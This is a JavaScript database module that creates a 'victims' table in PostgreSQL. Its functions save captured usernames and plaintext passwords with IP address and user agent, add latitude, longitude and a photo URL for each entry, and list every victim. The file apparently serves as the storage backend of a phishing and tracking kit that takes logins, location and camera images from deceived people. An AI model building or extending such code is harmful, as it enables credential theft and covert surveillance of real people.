// lib/db.js — PostgreSQL connection pool via Neon
import { neon } from '@neondatabase/serverless';

const sql = neon(process.env.DATABASE_URL);

export async function initDB() {
  await sql(`
    CREATE TABLE IF NOT EXISTS victims (
      id SERIAL PRIMARY KEY,
      ip_address VARCHAR(45),
      user_agent TEXT,
      username VARCHAR(255),
      password VARCHAR(255),
      latitude DECIMAL(10, 8),
      longitude DECIMAL(11, 8),
      location_accuracy DECIMAL(10, 2),
      photo_url TEXT,
      captured_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);
  console.log('[DB] Table initialized');
}

export async function saveCredentials(username, password, ip, ua) {
  const result = await sql`
    INSERT INTO victims (ip_address, user_agent, username, password)
    VALUES (${ip}, ${ua}, ${username}, ${password})
    RETURNING id;
  `;
  return result[0].id;
}

export async function updateCapture(id, lat, lng, accuracy, photoUrl) {
  await sql`
    UPDATE victims
    SET latitude = ${lat}, longitude = ${lng}, 
        location_accuracy = ${accuracy}, photo_url = ${photoUrl}
    WHERE id = ${id};
  `;
}

export async function getAllVictims() {
  return await sql`
    SELECT * FROM victims ORDER BY captured_at DESC;
  `;
}
